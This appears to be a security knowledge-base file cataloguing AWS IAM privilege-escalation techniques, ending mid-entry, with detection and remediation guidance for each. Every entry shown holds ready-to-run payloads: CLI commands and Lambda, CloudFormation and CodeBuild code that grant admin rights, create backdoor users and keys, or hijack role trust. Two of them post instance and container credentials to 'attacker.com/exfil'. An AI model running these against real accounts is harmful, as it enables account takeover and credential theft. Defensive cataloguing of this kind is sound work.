description: AWS IAM privilege escalation occurs when an attacker with limited IAM permissions exploits overly permissive policies, role trust relationships, or service-linked capabilities to gain elevated access. These techniques allow lateral movement and vertical privilege escalation within AWS accounts, often leading to full administrative control.

entries.name: Privilege Escalation via iam:CreatePolicyVersion
entries.description: An IAM principal with iam:CreatePolicyVersion can create a new version of a managed policy with arbitrary permissions and set it as the default, effectively granting themselves any permission.
entries.how_it_works: AWS managed policies support up to 5 versions. When a new version is created with --set-as-default, it immediately becomes active. An attacker creates a new policy version containing Action:* Resource:* and sets it as default, escalating to full admin.
preconditions: IAM principal has iam:CreatePolicyVersion permission
Principal has a customer-managed policy attached (not AWS-managed)
Policy has fewer than 5 versions or attacker can delete old versions
impact: Full administrative access to the AWS account
Ability to read/modify/delete any resource
Persistence via creating new IAM users or roles
Data exfiltration from all services
entries.detection_guidance: Scan IAM policies and IaC templates for iam:CreatePolicyVersion in Action fields. In CloudTrail, monitor CreatePolicyVersion events where the new version document contains Action:* or Resource:*. Flag any non-admin principal with this permission.
exploit_payloads: aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/MyPolicy
aws iam delete-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --version-id v1
remediation: Remove iam:CreatePolicyVersion from non-admin IAM policies
Use AWS-managed policies which cannot be modified by users
Apply permissions boundaries to restrict maximum permissions
Enable CloudTrail and set up alerts for CreatePolicyVersion API calls
Use SCPs to restrict policy modification at the organization level

entries.name: Privilege Escalation via iam:SetDefaultPolicyVersion
entries.description: An IAM principal with iam:SetDefaultPolicyVersion can switch the active version of a managed policy to a previously created version that may contain more permissive statements.
entries.how_it_works: Managed policies retain up to 5 versions. If a previous version contained broader permissions (e.g., before a policy was tightened), an attacker can revert to that permissive version by calling SetDefaultPolicyVersion. This does not create a new version but reactivates an old one.
preconditions: IAM principal has iam:SetDefaultPolicyVersion permission
A previous policy version exists with more permissive statements
The target policy is customer-managed (not AWS-managed)
impact: Revert security-tightening changes to IAM policies
Gain permissions that were previously revoked
Potential full admin access if an old version was permissive
entries.detection_guidance: Scan for iam:SetDefaultPolicyVersion in IAM policies. Monitor CloudTrail for SetDefaultPolicyVersion events. Audit policy version history for versions with overly broad permissions that should be deleted.
exploit_payloads: aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/MyPolicy
aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --version-id v1
aws iam set-default-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --version-id v1
remediation: Remove iam:SetDefaultPolicyVersion from non-admin policies
Delete old permissive policy versions after tightening policies
Use AWS-managed policies where possible
Implement SCPs to restrict this action

entries.name: Privilege Escalation via iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
entries.description: An attacker with iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction can create a Lambda function that executes with a high-privilege role, then invoke it to perform privileged actions.
entries.how_it_works: The attacker creates a Lambda function and passes it an existing high-privilege role (e.g., an admin role used by another service). The Lambda function code performs privileged operations such as creating a new admin user. When invoked, the function executes with the passed role's permissions, not the attacker's.
preconditions: IAM principal has iam:PassRole permission (on a high-privilege role)
IAM principal has lambda:CreateFunction permission
IAM principal has lambda:InvokeFunction permission
A high-privilege IAM role exists with a trust policy that allows lambda.amazonaws.com to assume it
impact: Execute arbitrary code with the privileges of the passed role
Create new admin users or access keys
Access any resource the passed role can access
Exfiltrate data from S3, DynamoDB, Secrets Manager, etc.
entries.detection_guidance: Scan for policies granting iam:PassRole with Resource:* combined with lambda:CreateFunction. In CloudTrail, monitor CreateFunction events and correlate the Role ARN with high-privilege roles. Flag Lambda functions created with admin roles.
exploit_payloads:
# Create malicious Lambda function code
import boto3
def handler(event, context):
    client = boto3.client('iam')
    client.attach_user_policy(
        UserName='attacker',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return 'escalated'
zip function.zip lambda_function.py
aws lambda create-function --function-name escalate --runtime python3.12 --role arn:aws:iam::123456789012:role/AdminRole --handler lambda_function.handler --zip-file fileb://function.zip
aws lambda invoke --function-name escalate output.json
remediation: Restrict iam:PassRole to specific role ARNs, never use Resource:*
Add iam:PassedToService condition to limit which services can receive the role
Apply permissions boundaries to all roles that can be passed
Use separate low-privilege roles for Lambda functions
Monitor Lambda function creation with privileged roles via CloudTrail

entries.name: Privilege Escalation via iam:PassRole + ec2:RunInstances
entries.description: An attacker with iam:PassRole and ec2:RunInstances can launch an EC2 instance with a high-privilege instance profile, then access the instance metadata service to obtain temporary credentials for that role.
entries.how_it_works: The attacker launches an EC2 instance and attaches a high-privilege instance profile via PassRole. Once the instance is running, the attacker connects (via SSM, SSH, or user data script) and queries the instance metadata service at 169.254.169.254 to retrieve temporary credentials for the attached role. These credentials can be used from anywhere.
preconditions: IAM principal has iam:PassRole on a high-privilege role
IAM principal has ec2:RunInstances permission
An instance profile exists linked to a high-privilege role
The role's trust policy allows ec2.amazonaws.com
Network access to the launched instance (or use of user data to exfiltrate credentials)
impact: Obtain temporary credentials for any passable role
Full account compromise if an admin instance profile exists
Lateral movement to other services
Credentials valid for up to 6 hours by default
entries.detection_guidance: Scan for iam:PassRole + ec2:RunInstances in IAM policies. Monitor RunInstances CloudTrail events and check if the instance profile role has elevated permissions. Detect credential use from unexpected IP ranges (outside VPC).
exploit_payloads:
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.micro --iam-instance-profile Name=AdminInstanceProfile --key-name attacker-key --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds.json
curl -X POST https://attacker.com/exfil -d @/tmp/creds.json'

# From inside the instance:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# With IMDSv2:
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
remediation: Restrict iam:PassRole to specific low-privilege role ARNs
Use iam:PassedToService condition key
Require IMDSv2 (HttpTokens=required) to mitigate SSRF-based credential theft
Apply permissions boundaries to instance profile roles
Monitor RunInstances events for unexpected instance profile attachments
Restrict ec2:RunInstances to specific VPCs and subnets

entries.name: Privilege Escalation via iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask
entries.description: An attacker can register an ECS task definition with a high-privilege task role and run it to execute arbitrary code with elevated permissions.
entries.how_it_works: The attacker registers a new ECS task definition specifying a high-privilege task role ARN. The container image is set to one the attacker controls (or a public image with a command override). When the task runs, the container inherits the task role's credentials via the ECS credential endpoint, enabling privileged API calls.
preconditions: IAM principal has iam:PassRole on a high-privilege role
IAM principal has ecs:RegisterTaskDefinition permission
IAM principal has ecs:RunTask permission
An ECS cluster exists
A high-privilege role with ecs-tasks.amazonaws.com trust exists
impact: Execute arbitrary code with task role permissions
Access secrets, databases, S3 buckets accessible to the task role
Full account compromise if an admin task role is available
entries.detection_guidance: Scan for policies granting iam:PassRole + ecs:RegisterTaskDefinition. Monitor CloudTrail for RegisterTaskDefinition events with unexpected task role ARNs. Alert when task definitions reference roles outside the expected set.
exploit_payloads: aws ecs register-task-definition --family escalation-task --task-role-arn arn:aws:iam::123456789012:role/AdminTaskRole --container-definitions '[{"name":"exploit","image":"amazonlinux:2","command":["sh","-c","curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -X POST -d @- https://attacker.com/exfil"],"essential":true,"memory":512}]' --requires-compatibilities FARGATE --network-mode awsvpc --cpu 256 --memory 512
aws ecs run-task --cluster my-cluster --task-definition escalation-task --launch-type FARGATE --network-configuration '{"awsvpcConfiguration":{"subnets":["subnet-12345"],"assignPublicIp":"ENABLED"}}'
remediation: Restrict iam:PassRole to specific ECS task role ARNs
Use iam:PassedToService condition key for ecs-tasks.amazonaws.com
Scope ecs:RegisterTaskDefinition and ecs:RunTask to specific clusters
Apply permissions boundaries to task roles
Monitor task definition registration for unexpected role assignments

entries.name: Privilege Escalation via iam:PassRole + cloudformation:CreateStack
entries.description: An attacker with iam:PassRole and cloudformation:CreateStack can create a CloudFormation stack with a high-privilege service role, enabling creation of arbitrary AWS resources including new admin users.
entries.how_it_works: CloudFormation stacks can be created with a service role that CloudFormation assumes to create resources. If an attacker can pass a high-privilege role to CloudFormation, the stack template can include any resources (IAM users, policies, roles) that the service role has permission to create.
preconditions: IAM principal has iam:PassRole on a high-privilege role
IAM principal has cloudformation:CreateStack permission
A high-privilege role with cloudformation.amazonaws.com trust exists
impact: Create arbitrary AWS resources via CloudFormation templates
Create new IAM admin users with access keys
Modify security groups, VPCs, and other infrastructure
Full account takeover
entries.detection_guidance: Scan for iam:PassRole + cloudformation:CreateStack in policies. Monitor CreateStack CloudTrail events where RoleARN is a high-privilege role. Inspect stack templates for IAM resource creation.
exploit_payloads:
# Create malicious CloudFormation template
cat > escalate.yaml << 'TMPL'
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  AdminUser:
    Type: AWS::IAM::User
    Properties:
      UserName: backdoor-admin
      Policies:
        - PolicyName: AdminAccess
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action: '*'
                Resource: '*'
  AdminKey:
    Type: AWS::IAM::AccessKey
    Properties:
      UserName: !Ref AdminUser
Outputs:
  AccessKeyId:
    Value: !Ref AdminKey
  SecretKey:
    Value: !GetAtt AdminKey.SecretAccessKey
TMPL
aws cloudformation create-stack --stack-name escalation-stack --template-body file://escalate.yaml --role-arn arn:aws:iam::123456789012:role/CFNAdminRole --capabilities CAPABILITY_NAMED_IAM
aws cloudformation describe-stacks --stack-name escalation-stack --query 'Stacks[0].Outputs'
remediation: Restrict iam:PassRole to specific CloudFormation service roles with limited permissions
Apply permissions boundaries to CloudFormation service roles
Use SCPs to deny creation of IAM resources via CloudFormation for non-admin accounts
Scope cloudformation:CreateStack to specific stack name patterns
Enable CloudFormation drift detection and stack policy

entries.name: Privilege Escalation via iam:PassRole + glue:CreateDevEndpoint
entries.description: An attacker with iam:PassRole and glue:CreateDevEndpoint can create a Glue development endpoint that runs with a high-privilege service role, providing SSH access to execute commands with those credentials.
entries.how_it_works: AWS Glue development endpoints are essentially managed EC2 instances for ETL development. When created, a service role is attached. The attacker passes a high-privilege role to the endpoint, SSHes into it, and uses the role credentials available from the instance metadata or environment to perform privileged operations.
preconditions: IAM principal has iam:PassRole on a high-privilege role
IAM principal has glue:CreateDevEndpoint permission
A role with glue.amazonaws.com trust exists with elevated permissions
Attacker has an SSH public key to provide
impact: Interactive SSH access with high-privilege role credentials
Long-lived access (endpoint persists until deleted)
Full account compromise if admin role is passed
Data exfiltration from data lakes, S3, and databases
entries.detection_guidance: Scan for iam:PassRole + glue:CreateDevEndpoint. Monitor CreateDevEndpoint CloudTrail events. Alert on dev endpoints created with roles outside the expected Glue service roles. Note: Glue dev endpoints are a legacy feature being replaced by Glue Interactive Sessions.
exploit_payloads: aws glue create-dev-endpoint --endpoint-name escalation-endpoint --role-arn arn:aws:iam::123456789012:role/GlueAdminRole --public-key 'ssh-rsa AAAA...' --number-of-nodes 2
aws glue get-dev-endpoint --endpoint-name escalation-endpoint

# SSH into the endpoint and use the attached role credentials
ssh -i private_key glue@<endpoint-public-address>
aws sts get-caller-identity
remediation: Restrict iam:PassRole to specific Glue service roles with minimal permissions
Prefer Glue Interactive Sessions over legacy dev endpoints
Apply permissions boundaries to Glue service roles
Monitor and auto-terminate unexpected Glue dev endpoints
Restrict network access from Glue endpoints

entries.name: Privilege Escalation via iam:AttachUserPolicy
entries.description: An IAM principal with iam:AttachUserPolicy can attach any AWS-managed or customer-managed policy to any user, including attaching AdministratorAccess to themselves.
entries.how_it_works: The AttachUserPolicy API associates a managed policy with an IAM user. If an attacker has this permission without resource restrictions, they can attach the AWS-managed AdministratorAccess policy to their own user, instantly gaining full admin permissions.
preconditions: IAM principal has iam:AttachUserPolicy permission
Permission is not restricted by resource ARN to specific users/policies
Attacker knows their own IAM user ARN
impact: Immediate full administrative access to the AWS account
Ability to create persistence mechanisms
Data exfiltration and resource manipulation
entries.detection_guidance: Scan for iam:AttachUserPolicy with Resource:* in IAM policies. Monitor AttachUserPolicy CloudTrail events. Alert when AdministratorAccess or PowerUser policies are attached outside of approved processes.
exploit_payloads: aws iam attach-user-policy --user-name attacker-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-attached-user-policies --user-name attacker-user
aws sts get-caller-identity
remediation: Never grant iam:AttachUserPolicy with Resource:*
Restrict to specific user ARNs and policy ARNs using conditions
Explicitly deny attachment of admin and IAM management policies
Use permissions boundaries to cap maximum permissions
Monitor AttachUserPolicy events in CloudTrail

entries.name: Privilege Escalation via iam:AttachRolePolicy
entries.description: An IAM principal with iam:AttachRolePolicy can attach any managed policy to any role, including attaching AdministratorAccess to a role they can assume.
entries.how_it_works: The attacker attaches a highly privileged managed policy (such as AdministratorAccess) to a role that they can assume. After attachment, they assume the role and gain the elevated permissions. This can target any role including service roles, cross-account roles, or their own role.
preconditions: IAM principal has iam:AttachRolePolicy permission without resource restriction
Attacker can assume at least one IAM role (via sts:AssumeRole, instance profile, etc.)
impact: Escalate any assumable role to admin
Compromise service roles used by Lambda, ECS, EC2
Persistent elevated access through modified roles
entries.detection_guidance: Scan for iam:AttachRolePolicy with Resource:* in policies. Monitor AttachRolePolicy CloudTrail events. Alert when admin-level policies are attached to roles outside of CI/CD pipelines or approved automation.
exploit_payloads: aws iam attach-role-policy --role-name my-assumable-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/my-assumable-role --role-session-name escalated

# Use returned credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
aws sts get-caller-identity
remediation: Restrict iam:AttachRolePolicy to specific role ARN patterns
Use iam:PolicyARN condition to deny attachment of admin policies
Apply permissions boundaries to all roles
Use SCPs to restrict policy attachment at the organization level
Monitor and alert on AttachRolePolicy calls

entries.name: Privilege Escalation via iam:PutUserPolicy
entries.description: An IAM principal with iam:PutUserPolicy can create or update an inline policy on any IAM user, granting arbitrary permissions including full admin access.
entries.how_it_works: Unlike managed policies which must be created separately, inline policies are embedded directly in a user. PutUserPolicy creates or overwrites an inline policy on the target user. An attacker puts an inline policy with Action:* Resource:* on their own user to gain admin access.
preconditions: IAM principal has iam:PutUserPolicy permission
Permission is not restricted to specific user ARNs
impact: Immediate admin access by putting a permissive inline policy
Can grant permissions to any user in the account
Harder to audit than managed policy attachments (inline policies are per-user)
entries.detection_guidance: Scan for iam:PutUserPolicy in IAM policies. Monitor PutUserPolicy CloudTrail events. Alert when inline policies containing Action:* or Resource:* are created.
exploit_payloads: aws iam put-user-policy --user-name attacker-user --policy-name admin-escalation --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
aws iam list-user-policies --user-name attacker-user
aws iam get-user-policy --user-name attacker-user --policy-name admin-escalation
remediation: Deny iam:PutUserPolicy for all non-admin principals
Prefer managed policies over inline policies for easier auditing
Use SCPs to deny inline policy creation
Apply permissions boundaries to all users
Monitor PutUserPolicy events and alert on overly permissive inline policies

entries.name: Privilege Escalation via iam:PutRolePolicy
entries.description: An IAM principal with iam:PutRolePolicy can create or update an inline policy on any IAM role, granting that role arbitrary permissions.
entries.how_it_works: The attacker puts a permissive inline policy on a role they can assume. After the inline policy is created, the attacker assumes the role and gains the elevated permissions. This works on any role including cross-account roles, service roles, and the attacker's own role.
preconditions: IAM principal has iam:PutRolePolicy permission
Attacker can assume at least one role in the account
impact: Escalate any assumable role to admin privileges
Backdoor service roles for persistent access
Modify CI/CD pipeline roles to inject into deployments
entries.detection_guidance: Scan for iam:PutRolePolicy with Resource:*. Monitor PutRolePolicy CloudTrail events. Detect inline policies added to roles outside of IaC deployment pipelines.
exploit_payloads: aws iam put-role-policy --role-name my-role --policy-name escalation --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/my-role --role-session-name admin-session
remediation: Deny iam:PutRolePolicy for non-admin principals
Use IaC pipelines as the only mechanism to modify role policies
Apply permissions boundaries to all roles
Monitor PutRolePolicy CloudTrail events
Use SCPs at the organization level to restrict inline policy creation

entries.name: Privilege Escalation via iam:CreateAccessKey
entries.description: An IAM principal with iam:CreateAccessKey can create access keys for any IAM user, obtaining long-lived credentials to impersonate that user.
entries.how_it_works: The CreateAccessKey API generates a new access key pair (access key ID and secret key) for the specified user. If unrestricted, an attacker can create keys for an admin user, effectively impersonating them. Unlike temporary credentials, access keys do not expire by default.
preconditions: IAM principal has iam:CreateAccessKey permission
Permission is not restricted to specific user ARNs
Target user exists and has fewer than 2 access keys (AWS limit)
impact: Long-lived credentials for any IAM user
Impersonation of admin users
Persistent access even if the attacker's own credentials are revoked
Credentials can be used from anywhere
entries.detection_guidance: Scan for iam:CreateAccessKey with Resource:*. Monitor CreateAccessKey CloudTrail events. Alert when keys are created for users outside of self-service key rotation. Track access key age and usage patterns.
exploit_payloads: aws iam list-users
aws iam list-attached-user-policies --user-name admin-user
aws iam create-access-key --user-name admin-user

# Use the returned AccessKeyId and SecretAccessKey
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
remediation: Restrict iam:CreateAccessKey to self (using ${aws:username} variable)
Require MFA for access key creation
Implement access key rotation policies
Monitor CreateAccessKey events for non-self-service usage
Consider eliminating long-lived access keys in favor of IAM Identity Center

entries.name: Privilege Escalation via iam:CreateLoginProfile
entries.description: An IAM principal with iam:CreateLoginProfile can enable console access for any IAM user that does not yet have a password, allowing the attacker to log into the AWS Console as that user.
entries.how_it_works: The CreateLoginProfile API sets an initial password for an IAM user, enabling AWS Management Console access. If an admin user exists that only uses programmatic access (no console password), an attacker can create a login profile for that user, set a known password, and log into the console with the admin user's full permissions.
preconditions: IAM principal has iam:CreateLoginProfile permission
Target user does not already have a console login profile
Permission is not restricted to specific user ARNs
impact: Console access as any IAM user without existing login profile
Full GUI access to all services the target user can access
Can enable MFA bypass if MFA conditions only apply to programmatic access
entries.detection_guidance: Scan for iam:CreateLoginProfile with Resource:*. Monitor CreateLoginProfile CloudTrail events. Alert when login profiles are created for service accounts or admin users that should not have console access.
exploit_payloads: aws iam list-users --query 'Users[?!PasswordLastUsed].UserName'
aws iam create-login-profile --user-name admin-service-account --password 'Att@cker-P@ss-2024!' --no-password-reset-required

# Log into AWS Console at https://123456789012.signin.aws.amazon.com/console
# Username: admin-service-account
# Password: Att@cker-P@ss-2024!
remediation: Restrict iam:CreateLoginProfile to self only
Use IAM Identity Center (SSO) instead of IAM user passwords
Require MFA for all console logins
Monitor CreateLoginProfile CloudTrail events
Disable console access for service accounts via SCP

entries.name: Privilege Escalation via iam:UpdateLoginProfile
entries.description: An IAM principal with iam:UpdateLoginProfile can reset the console password for any IAM user that already has a login profile, hijacking their console access.
entries.how_it_works: Unlike CreateLoginProfile which fails if a password already exists, UpdateLoginProfile changes the existing password. An attacker can reset any user's password to a known value, then log into the console as that user. This is particularly dangerous against admin users.
preconditions: IAM principal has iam:UpdateLoginProfile permission
Target user already has a console login profile (password set)
Permission is not restricted to specific user ARNs
impact: Hijack console access for any IAM user with existing login
Lock out legitimate users by changing their passwords
Access all console-accessible resources of the target user
entries.detection_guidance: Scan for iam:UpdateLoginProfile with Resource:*. Monitor UpdateLoginProfile CloudTrail events where the caller is not the target user. Alert on password changes performed by different users.
exploit_payloads: aws iam list-users
aws iam update-login-profile --user-name admin-user --password 'N3w-Att@cker-P@ss!'
# Log into AWS Console with the reset password
remediation: Restrict iam:UpdateLoginProfile to self-service only (${aws:username})
Require MFA for password changes
Use IAM Identity Center instead of IAM user passwords
Monitor UpdateLoginProfile events where caller differs from target
Implement break-glass procedures for admin password resets

entries.name: Privilege Escalation via iam:UpdateAssumeRolePolicy
entries.description: An IAM principal with iam:UpdateAssumeRolePolicy can modify the trust policy of any role to allow themselves (or any principal) to assume it, effectively hijacking any role in the account.
entries.how_it_works: Every IAM role has a trust policy that defines who can assume it. UpdateAssumeRolePolicy replaces this trust policy entirely. An attacker modifies the trust policy of a high-privilege role to add their own principal as a trusted entity, then assumes the role to gain its permissions.
preconditions: IAM principal has iam:UpdateAssumeRolePolicy permission
High-privilege roles exist in the account
Attacker knows the ARN of a target role
impact: Assume any role in the account regardless of current trust policy
Bypass cross-account trust restrictions
Hijack service roles (Lambda, ECS, EC2 instance profiles)
Full account compromise by assuming admin roles
entries.detection_guidance: Scan for iam:UpdateAssumeRolePolicy in IAM policies. Monitor UpdateAssumeRolePolicy CloudTrail events. Alert when trust policies are modified to add unexpected principals. Track trust policy changes as configuration drift.
exploit_payloads: aws iam update-assume-role-policy --role-name AdminRole --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::123456789012:user/attacker"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name escalated

# Alternatively, trust an external account for cross-account access:
aws iam update-assume-role-policy --role-name AdminRole --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999999999999:root"},"Action":"sts:AssumeRole"}]}'
remediation: Deny iam:UpdateAssumeRolePolicy for all non-admin principals
Use SCPs to restrict trust policy modifications to specific admin roles
Monitor UpdateAssumeRolePolicy CloudTrail events closely
Implement AWS Config rules to detect trust policy drift
Use IAM Access Analyzer to identify roles with overly broad trust policies

entries.name: Privilege Escalation via iam:DeleteRolePermissionsBoundary
entries.description: An IAM principal with iam:DeleteRolePermissionsBoundary can remove the permissions boundary from a role, expanding its effective permissions beyond what was intended.
entries.how_it_works: Permissions boundaries limit the maximum permissions an IAM entity can have, even if its policies grant broader access. A role may have policies granting Action:* but a permissions boundary restricting it to specific services. Removing the boundary causes the full policy permissions to take effect immediately.
preconditions: IAM principal has iam:DeleteRolePermissionsBoundary permission
A role exists with a permissions boundary that restricts its effective permissions
The role's attached policies grant more permissions than the boundary allows
impact: Expand effective permissions of a role beyond intended limits
Bypass security controls implemented via permissions boundaries
Potentially escalate a limited role to full admin if underlying policies are broad
entries.detection_guidance: Scan for iam:DeleteRolePermissionsBoundary or iam:DeleteUserPermissionsBoundary in IAM policies. Monitor DeleteRolePermissionsBoundary CloudTrail events. Alert on any permissions boundary removal outside of approved change management.
exploit_payloads:
# Check current permissions boundary
aws iam get-role --role-name restricted-admin-role --query 'Role.PermissionsBoundary'

# Remove the boundary
aws iam delete-role-permissions-boundary --role-name restricted-admin-role

# Role now has full policy permissions without boundary restriction
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/restricted-admin-role --role-session-name unbound
remediation: Deny iam:DeleteRolePermissionsBoundary via SCP for all non-admin principals
Use SCPs as an additional layer of protection beyond IAM policies
Monitor DeleteRolePermissionsBoundary CloudTrail events
Implement AWS Config rules to detect missing permissions boundaries
Require permissions boundaries on all roles via SCP conditions

entries.name: Privilege Escalation via iam:DeleteUserPermissionsBoundary
entries.description: An IAM principal with iam:DeleteUserPermissionsBoundary can remove the permissions boundary from an IAM user, expanding the user's effective permissions.
entries.how_it_works: Identical to the role-based variant but targets IAM users. The attacker removes the permissions boundary from their own user (or another user), causing the user's attached policies to take full effect without the boundary's restrictions.
preconditions: IAM principal has iam:DeleteUserPermissionsBoundary permission
A user exists with a permissions boundary that limits effective permissions
The user's policies grant more permissions than the boundary allows
impact: Expand user's effective permissions beyond intended limits
Bypass permissions boundary security controls
Self-escalation if attacker can remove their own boundary
entries.detection_guidance: Scan for iam:DeleteUserPermissionsBoundary in IAM policies. Monitor DeleteUserPermissionsBoundary CloudTrail events. Alert on any boundary removal.
exploit_payloads: aws iam get-user --user-name my-user --query 'User.PermissionsBoundary'
aws iam delete-user-permissions-boundary --user-name my-user

# User now has full policy permissions
aws sts get-caller-identity
remediation: Deny iam:DeleteUserPermissionsBoundary for all non-security-admin principals
Enforce via SCP at the organization level
Monitor CloudTrail for boundary deletion events
Implement drift detection for permissions boundaries

entries.name: Privilege Escalation via lambda:UpdateFunctionCode + lambda:InvokeFunction
entries.description: An attacker who can update a Lambda function's code and invoke it can replace the function with malicious code that executes with the function's existing IAM role, which may have higher privileges.
entries.how_it_works: Existing Lambda functions often have roles with broader permissions than the developer who deploys them. An attacker updates the function code to perform privileged actions (e.g., creating admin users, exfiltrating secrets) and then invokes the function. The malicious code runs with the Lambda execution role's permissions.
preconditions: IAM principal has lambda:UpdateFunctionCode permission
IAM principal has lambda:InvokeFunction permission (or can trigger the function via events)
A Lambda function exists with a higher-privilege execution role
impact: Execute arbitrary code with the function's execution role privileges
Access secrets, databases, S3 data accessible to the function
Potential full account compromise if the function role is overly permissive
entries.detection_guidance: Scan for lambda:UpdateFunctionCode in IAM policies. Monitor UpdateFunctionCode CloudTrail events. Implement code signing for Lambda functions to prevent unauthorized code changes. Compare deployed function code hashes against approved versions.
exploit_payloads:
# Create malicious function code
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json
def handler(event, context):
    iam = boto3.client('iam')
    iam.create_user(UserName='backdoor')
    iam.attach_user_policy(
        UserName='backdoor',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    keys = iam.create_access_key(UserName='backdoor')
    return json.dumps(keys['AccessKey'], default=str)
EOF
cd /tmp && zip function.zip lambda_function.py
aws lambda update-function-code --function-name existing-function --zip-file fileb:///tmp/function.zip
aws lambda invoke --function-name existing-function /tmp/output.json && cat /tmp/output.json
remediation: Restrict lambda:UpdateFunctionCode to specific function ARNs
Implement Lambda code signing to prevent unauthorized code deployment
Apply least-privilege execution roles to Lambda functions
Deploy Lambda functions only through CI/CD pipelines
Monitor UpdateFunctionCode events and alert on manual updates

entries.name: Cross-Account Role Assumption without ExternalId
entries.description: An IAM role configured for cross-account access without requiring an ExternalId condition is vulnerable to the 'confused deputy' attack, allowing unauthorized third parties to assume the role.
entries.how_it_works: When Account A creates a role trusting Account B, any principal in Account B can assume the role. If a service in Account B is tricked by Account C into assuming the role on C's behalf (confused deputy), Account C gains access to Account A's resources. ExternalId is a shared secret that prevents this: only principals knowing the ExternalId can assume the role.
preconditions: IAM role trusts an external AWS account
Trust policy does not require sts:ExternalId condition
The trusted account runs a multi-tenant service that assumes roles on behalf of customers
impact: Unauthorized cross-account access via confused deputy
Third-party accounts accessing resources in the trusting account
Data exfiltration or modification across account boundaries
entries.detection_guidance: Scan all IAM role trust policies for cross-account principals without sts:ExternalId conditions. Use IAM Access Analyzer to identify roles accessible from external accounts. Audit trust policies in IaC templates.
exploit_payloads:
# From a principal in the trusted account (or any tenant of a multi-tenant service in that account)
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/CrossAccountRole --role-session-name confused-deputy

# Verify access
aws s3 ls --profile cross-account

# If ExternalId were required, this would fail without providing it:
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/CrossAccountRole --role-session-name test --external-id required-secret-id
remediation: Always require sts:ExternalId in cross-account trust policies
Use unique ExternalId values per customer/tenant
Restrict trust to specific role ARNs rather than account root
Use IAM Access Analyzer to find externally accessible roles
Regularly audit cross-account trust policies

entries.name: Privilege Escalation via codebuild:StartBuild with Privileged Service Role
entries.description: An attacker with codebuild:StartBuild can trigger a CodeBuild project that runs with a privileged service role, and override build commands to execute arbitrary code with that role's permissions.
entries.how_it_works: CodeBuild projects have a service role that the build environment assumes. If an attacker can start a build and override the buildspec (build commands), they can execute arbitrary AWS CLI commands in the build container with the service role's credentials. Even without override permissions, the existing buildspec may expose credentials or allow exfiltration.
preconditions: IAM principal has codebuild:StartBuild permission
A CodeBuild project exists with a high-privilege service role
Optionally: codebuild:UpdateProject to modify the buildspec, or the project allows buildspec override
impact: Execute arbitrary commands with the CodeBuild service role
Access secrets, S3, databases available to the service role
Inject malicious code into CI/CD pipelines
Exfiltrate credentials and data
entries.detection_guidance: Scan for codebuild:StartBuild in IAM policies. Check CodeBuild project service roles for overly broad permissions. Monitor StartBuild CloudTrail events with buildspecOverride. Alert on builds started outside of normal CI/CD triggers.
exploit_payloads:
# Start a build with overridden buildspec
aws codebuild start-build --project-name my-project --buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - aws sts get-caller-identity
      - aws iam create-user --user-name backdoor
      - aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      - aws iam create-access-key --user-name backdoor'
aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].logs.deepLink'
remediation: Apply least-privilege to CodeBuild service roles
Disable buildspec override by using source-embedded buildspec only
Restrict codebuild:StartBuild to specific project ARNs
Monitor StartBuild events with overrides
Use VPC-bound CodeBuild projects to limit network access

entries.name: Privilege Escalation via ssm:StartSession + ec2:DescribeInstances
entries.description: An attacker with ssm:StartSession can start an interactive shell session on any SSM-managed EC2 instance without needing SSH keys, gaining access to the instance's IAM instance profile credentials.
entries.how_it_works: AWS Systems Manager Session Manager provides browser-based and CLI-based shell access to EC2 instances. If an attacker can describe instances (to find high-value targets) and start sessions, they can connect to any instance running the SSM agent and access the instance's IAM role credentials via IMDS.
preconditions: IAM principal has ssm:StartSession permission
IAM principal has ec2:DescribeInstances permission (to find targets)
Target EC2 instances have SSM Agent running and are managed by SSM
